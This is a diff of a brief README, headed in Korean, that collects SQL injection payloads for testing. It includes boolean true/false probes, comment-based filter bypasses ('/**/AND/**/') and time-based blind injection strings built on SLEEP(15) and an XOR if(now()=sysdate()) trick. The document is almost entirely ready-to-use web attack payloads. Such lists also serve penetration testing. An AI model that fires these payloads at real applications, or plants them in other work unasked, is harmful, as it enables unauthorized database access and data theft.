@@ -1,12 +1,20 @@
 # SQLInjection
 SqIinjection 테스트 코드 
 
+```
 '//AND//'1%'='0 
+```
 
-우회 테스트 코드 
+주석으로 우회 
+```
 '/**/AND/**/'1%'='0
+```
 
-   
+시간 기반 테스트 
+```
+'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z 
+```
+
 
 OR x=y     
 
@@ -21,7 +29,6 @@ AND 7=9 AND (5=5
  AND 7=7 AND ('Z'='Y
  WHERE 1=1 AND 1=0
 
-'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
 AND SLEEP(15)
 + SLEEP(10) + '
 ' AnD SLEEP(15) ANd '1
